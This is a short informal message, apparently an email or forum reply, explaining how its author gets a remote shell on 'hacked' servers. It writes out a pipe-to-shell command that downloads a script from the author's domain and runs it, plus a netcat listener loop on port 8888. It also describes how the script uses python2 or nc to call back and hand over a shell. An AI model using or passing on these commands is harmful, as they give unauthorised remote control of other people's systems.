I have two things running on my server:

* A web server (apache) with a simple "sh" file, so that anyone can access
http://arthaud.me/sh
* A tmux running "while true; do nc -v -l -p 8888; done"

Running curl arthaud.me/sh|sh, it downloads my shell script at
https://arthaud.me/sh and executes it. That scripts checks if python2 or netcat
is available on the hacked server (using "if type python2", "if type nc"). if
one of them is available, it uses it to connect to arthaud.me port 8888 and bind
a shell on it. setid can also be used to detach the process from the current
process.

That way, by entering in my tmux (with tmux a) on my server, I have a real shell
on the server. That is basically called a reverse bind shell:

Tell me if I'm not clear.

Cheers,
